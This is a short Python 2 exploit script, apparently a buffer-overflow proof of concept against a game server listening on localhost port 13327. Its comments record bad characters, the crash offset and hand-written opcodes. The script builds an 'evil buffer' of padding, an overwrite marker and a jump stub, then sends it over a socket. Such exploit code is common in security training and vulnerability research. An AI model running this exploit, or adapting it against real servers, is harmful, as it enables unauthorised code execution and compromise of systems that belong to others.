#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	# bad chars: \x00, \x0a, \x0d, \x20 

	# offset found at 4368 / 46367046
	#crash = "\x41" * 4379

	#\x11 = device control character
	#\x90 = NOP
	#\x00 = null

	# add eax - 83C00C / 5 bytes
	# jmp eax - FFE0  /

	crash = "A" * 4368 + "B" * 4 + "\x83\xC0\x0C\xFF\xE0" + "\x90" * 2

	buffer = "\x11(setup sound " + crash + "\x90\x00#"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[!] Sending evil buffer..."
	sock.connect(("127.0.0.1", 13327))
	data = sock.recv(1024)
	print data

	sock.send(buffer)
	print "[*] Payload sent..."
	data = sock.recv(1024)
	print data

	sock.close()
	sys.exit(0)
	
